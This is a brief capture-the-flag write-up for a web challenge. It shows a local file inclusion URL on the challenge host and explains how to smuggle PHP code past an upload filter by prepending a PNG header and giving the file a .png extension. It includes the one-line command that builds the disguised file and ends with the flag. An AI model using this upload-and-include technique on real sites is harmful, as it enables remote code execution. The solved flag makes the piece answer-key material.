Local file inclusion:
http://lfi.hax1.allesctf.net:8081/index.php?site=<ANY PHP>

Upload php code with prepended `png-header` and `.png` extension and include that file.

`$ cat png-header flag.php > flag.png`

Flag: `CSCG{G3tting_RCE_0n_w3b_is_alw4ys_cool}`
